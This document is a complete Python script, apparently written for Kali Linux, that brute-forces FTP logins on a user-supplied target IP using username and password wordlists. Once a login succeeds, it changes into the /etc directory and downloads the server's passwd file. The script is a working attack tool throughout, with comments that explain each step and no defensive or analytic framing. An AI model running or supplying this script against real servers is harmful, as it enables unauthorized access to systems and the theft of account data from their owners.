# Import the necessary library for FTP operations
import ftplib
import time

# Global Variables
# Prompt user to input the target IP address
target = input("Enter target IP address: ")
port = 21  # FTP port, default is 21

# Open the files containing lists of users and passwords
# Change the paths accordingly
usersFile = open("/home/kali/users.txt", "r")
passwordsFile = open("/home/kali/passwords.txt", "r")

# Read the contents of the files and split them into lists
users = usersFile.read().split('\n')
passwords = passwordsFile.read().split('\n')

# Close the files after reading
usersFile.close()
passwordsFile.close()

# Connect to the FTP server
ftp = ftplib.FTP()
ftp.connect(target, port, timeout=5)

# Print the lists of users and passwords
print(users)
print(passwords)

# Brute force loop - iterate over each user and password combination
for user in users:
    for password in passwords:
        # Pause for 2 seconds after each attempt
        time.sleep(2)
        try:
            # Attempt to login using the current user and password
            print(f"Trying {user}:{password} ... ")
            ftp.login(user, password)
            print("[+] Connected using {}:{}".format(user, password))
            
            # If login successful, try to retrieve /etc/passwd file
            print("Trying to get /etc/passwd file ...")
            ftp.cwd("/etc")  # Change directory to /etc
            with open("passwd.txt", "wb") as file:
                ftp.retrbinary("RETR passwd", file.write)  # Retrieve the file
            
            # Break out of the loop as soon as a successful login is found
            break
        except ftplib.error_perm as error:
            # Handle error indicating wrong username or password
            print("[-] Wrong login and/or password {}".format(error))
        except Exception as error:
            # Handle other exceptions
            print("Something else went wrong: {}".format(error))
    else:
        continue  # Continue to the next iteration of the outer loop if no successful login is found
    break  # Break out of the outer loop if a successful login is found
